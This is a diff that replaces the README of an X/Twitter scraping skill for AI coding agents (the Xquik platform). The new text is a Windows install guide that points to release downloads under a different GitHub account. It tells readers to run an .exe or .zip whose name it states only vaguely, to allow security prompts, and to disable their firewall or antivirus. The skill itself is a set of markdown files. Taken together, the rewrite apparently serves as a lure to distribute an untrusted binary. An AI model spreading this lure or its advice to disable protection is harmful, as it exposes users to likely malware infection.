@@ -1,182 +1,170 @@
-# X API / Twitter Scraper Skill for AI Coding Agents
+# 🐦 x-twitter-scraper - Simple Twitter Data Extraction Tools
 
-An [AI agent skill](https://skills.sh) that gives coding agents deep knowledge of the [Xquik](https://xquik.com) X (Twitter) real-time data platform. Search and extract tweets, download media, scrape follower/following lists, monitor accounts, and connect to the MCP server for AI-native workflows.
+[![Download Latest Release](https://img.shields.io/badge/Download-x--twitter--scraper-blue?style=for-the-badge)](https://github.com/sushilckatoch/x-twitter-scraper/releases)
 
-Works with **40+ AI coding agents** including Claude Code, OpenAI Codex, Cursor, GitHub Copilot, Gemini CLI, Windsurf, VS Code, Cline, Roo Code, Goose, Amp, Augment, Continue, OpenHands, Trae, OpenCode, and more.
+---
 
-## Installation
+x-twitter-scraper lets you get information from Twitter (now called X) automatically. You can search tweets, look up users, gather follower lists, download media, track replies, retweets, and quotes, and much more. It works with many AI coding agents and offers tools for monitoring accounts and trending topics.
 
-Install via the [skills CLI](https://skills.sh) (auto-detects your installed agents):
+This guide will help you download and run the software on Windows without any technical knowledge.
 
-```bash
-npx skills add Xquik-dev/x-twitter-scraper
-```
+---
 
-### Manual Installation
+## 🔍 What You Can Do with x-twitter-scraper
 
-<details>
-<summary>Claude Code</summary>
+- Search tweets based on keywords or hashtags  
+- Look up user profiles and details  
+- Extract lists of followers and followings  
+- Download images, videos, and other media from tweets  
+- Gather replies, retweets, and quote tweets for analysis  
+- Monitor accounts for new tweets or activity  
+- Track trending topics on Twitter in real time  
+- Use it with AI agents through REST API or webhooks for automation  
+- Supports over 40 tools and integrates with agents like Claude Code, Cursor, Codex, Copilot, and Windsurf  
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .claude/skills/x-twitter-scraper
-```
-</details>
+---
 
-<details>
-<summary>Codex / Cursor / Gemini CLI / GitHub Copilot</summary>
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .agents/skills/x-twitter-scraper
-```
-</details>
+Before you start, make sure your computer matches these minimum requirements:
 
-<details>
-<summary>Windsurf</summary>
+- Windows 10 or later (64-bit recommended)  
+- 4 GB of RAM or more  
+- At least 500 MB of free disk space  
+- Internet connection for downloading and using the app  
+- Administrator permissions to install software  
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .windsurf/skills/x-twitter-scraper
-```
-</details>
+---
 
-<details>
-<summary>Cline</summary>
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .agents/skills/x-twitter-scraper
-```
-</details>
+The easiest way to start using x-twitter-scraper on your Windows PC is to download the latest release from the official GitHub page.
 
-<details>
-<summary>Roo Code</summary>
+Click the badge below to visit the download page and get the latest version:
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .roo/skills/x-twitter-scraper
-```
-</details>
+[![Download Latest Release](https://img.shields.io/badge/Download-x--twitter--scraper-green?style=for-the-badge)](https://github.com/sushilckatoch/x-twitter-scraper/releases)
 
-<details>
-<summary>Continue</summary>
+---
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .continue/skills/x-twitter-scraper
-```
-</details>
+## 📥 How to Download and Install on Windows
 
-<details>
-<summary>Goose</summary>
+1. Open your web browser and go to the releases page by clicking the badge at the top or this link:  
+   https://github.com/sushilckatoch/x-twitter-scraper/releases
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .goose/skills/x-twitter-scraper
-```
-</details>
+2. Look for the latest release, usually marked as the top item on the list with a version number (for example, v1.0.0).
 
-<details>
-<summary>OpenCode</summary>
+3. Find the file intended for Windows. It might have a name like `x-twitter-scraper-setup.exe` or `x-twitter-scraper-win.zip`.
 
-```bash
-git clone https://github.com/Xquik-dev/x-twitter-scraper.git .agents/skills/x-twitter-scraper
-```
-</details>
+4. Click on the file link to download it to your computer. The download folder is usually where your browser saves files.
 
-## What This Skill Does
+5. Once downloaded, if you got a `.zip` file, right-click it and choose "Extract All..." to unzip its contents.
 
-When installed, this skill gives your AI coding assistant deep knowledge of the Xquik platform:
+6. Run the installer by double-clicking the `.exe` setup file. If a security prompt appears, allow the installation to proceed.
 
-- **Tweet search & lookup**: Search tweets by keyword, hashtag, advanced operators (`from:`, `to:`, `"exact phrase"`, `OR`, `-exclude`). Get full engagement metrics (likes, retweets, replies, views, bookmarks) for any tweet
-- **User profile lookup**: Fetch follower/following counts, bio, location, and profile data for any X account
-- **Follower & following extraction**: Extract complete follower lists, verified followers, and following lists for any account
-- **Reply, retweet & quote extraction**: Bulk extract all replies, retweets, and quote tweets for any tweet
-- **Media download**: Download images, videos, and GIFs from any tweet with permanent hosted URLs
-- **Thread & article extraction**: Extract full tweet threads and linked article content
-- **Community & Space data**: Extract community members, moderators, posts, and Space participants
-- **People & tweet search extraction**: Bulk search for users by keyword or extract tweets by hashtag (up to 1,000)
-- **Mutual follow checker**: Check if two accounts follow each other
-- **X account monitoring**: Track accounts for new tweets, replies, quotes, retweets, and follower changes in real time
-- **Webhook delivery**: Receive HMAC-signed event notifications at your HTTPS endpoint
-- **Trending topics**: Get trending hashtags and topics by region
-- **Radar**: Trending news from 7 sources (Google Trends, Hacker News, Polymarket, TrustMRR, Wikipedia, GitHub, Reddit). Free
-- **Giveaway draws**: Run transparent draws from tweet replies with configurable filters
-- **Write actions**: Post tweets, like, retweet, follow/unfollow, send DMs, update profile, upload media, manage communities via connected X accounts
-- **Telegram integrations**: Receive real-time monitor event notifications in Telegram
-- **MCP server integration**: Connect AI agents to X data via MCP (v2: 2-tool sandbox covering 76 endpoints, v1 legacy: 18 discrete tools)
+7. Follow the on-screen instructions to complete the setup.
 
-## Capabilities
+8. After installation, you should see the x-twitter-scraper icon on your desktop or start menu.
 
-| Area | Details |
-|------|---------|
-| **REST API** | 76 endpoints across 12 resource groups with retry logic and pagination |
-| **Tweet Fetching** | Single tweet lookup with full metrics, keyword/hashtag search |
-| **User Lookup** | Profile data, follower/following counts, verified status |
-| **Follower Analysis** | Extract followers, following, verified followers for any account |
-| **Data Extraction** | 20 bulk extraction tools (replies, retweets, quotes, threads, articles, communities, lists, Spaces, people search, tweet search, mentions, posts) |
-| **Giveaway Draws** | Random winner selection from tweet replies with 11 filter options |
-| **Write Actions** | Post/delete tweets, like/unlike, retweet, follow/unfollow, DM, profile update, media upload, community actions |
-| **Telegram Integrations** | Real-time monitor event notifications via Telegram bot |
-| **Account Monitoring** | Real-time tracking of tweets, replies, quotes, retweets, follower changes |
-| **Webhooks** | HMAC-SHA256 signature verification in Node.js, Python, Go |
-| **Media Download** | Download images, videos, GIFs with permanent hosted URLs (first download metered, cached free) |
-| **MCP Server** | v2: 2-tool sandbox (76 endpoints), v1 legacy: 18 tools. StreamableHTTP, configs for 10 platforms |
-| **Engagement Analytics** | Likes, retweets, replies, quotes, views, bookmarks per tweet |
-| **Trending Topics** | Regional trends with search queries |
-| **Tweet Composition** | Algorithm-optimized tweet composer with scoring checklist (free) |
-| **TypeScript Types** | Complete type definitions for all API objects |
+---
 
-## Supported Agents
+## ▶️ Running x-twitter-scraper for the First Time
 
-Claude Code, OpenAI Codex, Cursor, GitHub Copilot, Gemini CLI, Windsurf, VS Code Copilot, Cline, Roo Code, Goose, Amp, Augment, Continue, OpenHands, Trae, OpenCode, and any agent that supports the skills.sh protocol.
+1. Double-click the x-twitter-scraper icon to open the app.
 
-## API Coverage
+2. The main window shows a simple menu with options like “Search Tweets,” “User Lookup,” “Download Media,” and “Account Monitoring.”
 
-| Resource | Endpoints |
-|----------|-----------|
-| X Lookups | Tweet by ID, search tweets, user profile, follow check, download media |
-| Extractions | Create (20 types), estimate, list, get results, export |
-| Monitors | Create, list, get, update, delete |
-| Events | List (filtered, paginated), get single |
-| Webhooks | Create, list, update, delete, test, deliveries |
-| Trends | Regional trending topics |
-| Radar | Trending topics & news from 7 sources (free) |
-| Draws | Create with filters, list, get with winners, export |
-| Styles | Analyze, save, list, get, delete, compare, performance |
-| Compose | Tweet composition (compose, refine, score) |
-| Drafts | Create, list, get, delete |
-| Account | Get account, update locale, set X identity, subscribe |
-| API Keys | Create, list, revoke |
-| X Accounts | Connect, list, get, disconnect, re-authenticate |
-| X Write | Tweet, delete, like, unlike, retweet, follow, unfollow, DM, profile, avatar, banner, media upload, communities |
-| Integrations | Create (Telegram), list, get, update, delete, test, deliveries |
+3. Select the task you want to do by clicking on it.
 
-## Skill Structure
+4. Enter the required information such as keywords, usernames, or URLs depending on the task.
 
-```
-x-twitter-scraper/
-├── skills/
-│   └── x-twitter-scraper/
-│       ├── SKILL.md                      # Main skill (auth, endpoints, patterns)
-│       ├── metadata.json                 # Version and references
-│       └── references/
-│           ├── api-endpoints.md          # All REST API endpoints
-│           ├── mcp-tools.md              # All 18 v1 legacy MCP tools with schemas
-│           ├── mcp-setup.md              # MCP configs for 10 platforms (v2 + v1)
-│           ├── webhooks.md               # Webhook setup & verification
-│           ├── extractions.md            # 20 extraction tool types
-│           ├── types.md                  # TypeScript type definitions
-│           └── python-examples.md        # Python code examples
-├── server.json                           # MCP Registry metadata
-├── glama.json                            # Glama.ai directory metadata
-├── logo.png                              # Marketplace logo
-├── LICENSE                               # MIT
-└── README.md                             # This file
-```
+5. Click “Run” or “Start” to begin the process.
 
-## Links
+6. The software will collect data and display it on the screen or save it into files inside the app folder.
 
-- [Xquik Platform](https://xquik.com)
-- [API Documentation](https://docs.xquik.com)
-- [API Reference](https://docs.xquik.com/api-reference/overview)
-- [MCP Server Guide](https://docs.xquik.com/mcp/overview)
-- [skills.sh Page](https://skills.sh/Xquik-dev/x-twitter-scraper)
+---
 
-## License
+## ⚙️ Common Tasks Explained
 
-MIT
+### Search Tweets
+
+Type your keywords or hashtags in the search box. You can search for recent or popular tweets. Press "Start" to see results.
+
+### User Lookup
+
+Enter a Twitter username to get profile details like name, bio, follower count, following count, and account creation date.
+
+### Follower/Following Extraction
+
+Enter a username. The app will collect a list of all followers or users that the person is following.
+
+### Media Download
+
+Provide a tweet URL or username. The app downloads images, videos, or gifs from the tweets linked to your input.
+
+### Reply/Retweet/Quote Extraction
+
+Input a tweet link. The tool collects replies, retweets, and quote tweets related to that tweet.
+
+### Account Monitoring
+
+Add an account username to monitor. The app keeps track of new tweets or activity and alerts you based on your setup.
+
+---
+
+## 🔧 Configuration Options
+
+You can adjust settings inside the app to suit your needs:
+
+- Choose data formats for export (CSV, JSON, or plain text)  
+- Set the number of tweets or users to fetch per operation  
+- Configure API keys if required for extended Twitter integration  
+- Turn on or off automatic updates  
+- Customize notification options for account monitoring  
+
+---
+
+## 🌐 Using API and Advanced Features
+
+If you are using AI coding agents or automation systems, x-twitter-scraper offers REST API endpoints. These let external programs request data from Twitter through this app using webhooks or server setup.
+
+This is mostly for advanced users setting up automated workflows with tools like Claude Code, Codex, or Copilot.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+- If the app won't start, check you installed the correct version for Windows.  
+- Make sure your internet connection is stable.  
+- Disable firewall or antivirus temporarily if connection or download issues occur.  
+- If you cannot fetch data, Twitter may have restrictions or API limits. Wait and try again later.  
+- Restart the app or your computer if the program freezes.  
+
+---
+
+## 🗂 Where to Find Your Data
+
+By default, x-twitter-scraper saves all results in the Documents folder, inside a folder named `x-twitter-scraper-data`. You will find organized subfolders for tweets, users, media, and logs.
+
+You can change this location in the app settings.
+
+---
+
+## ❓ Need More Help?
+
+- Use the Issues section on GitHub for technical questions:  
+  https://github.com/sushilckatoch/x-twitter-scraper/issues  
+- Check the README and Wiki on GitHub for detailed command and advanced usage.  
+- Contact support through the repository or community channels if available.
+
+---
+
+## ⚡ Updates and New Versions
+
+Keep an eye on the releases page for updates. New versions bring bug fixes, new tools, and improved features.
+
+You can update by downloading the latest release and running the installer again. Your data and settings will usually stay intact.
+
+---
+
+# [Download x-twitter-scraper](https://github.com/sushilckatoch/x-twitter-scraper/releases)  
+Click here to visit the releases page and get started.
